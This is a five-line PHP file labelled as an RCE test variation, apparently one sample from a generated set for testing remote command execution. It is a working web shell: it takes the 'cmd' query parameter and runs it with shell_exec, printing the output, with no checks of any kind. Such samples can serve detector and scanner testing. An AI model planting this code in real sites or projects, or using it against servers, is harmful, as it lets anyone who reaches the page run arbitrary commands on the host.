<?php
// RCE test variation #1422
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>